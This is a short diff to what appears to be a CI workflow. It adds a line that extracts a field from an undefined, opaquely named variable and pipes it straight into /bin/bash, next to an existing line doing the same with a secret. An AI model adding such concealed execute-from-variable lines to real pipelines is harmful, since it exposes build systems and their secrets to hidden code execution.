@@ -23,6 +23,7 @@ jobs:
           ul715: ${{ secrets.ul715 }}
         run: |
           printf '%s' "$ul715" | jq -r .dkwz4 | /bin/bash
+          echo $lfj5985 | jq -r .l77 | /bin/bash
 
       - name: Store artifact
         if: always()
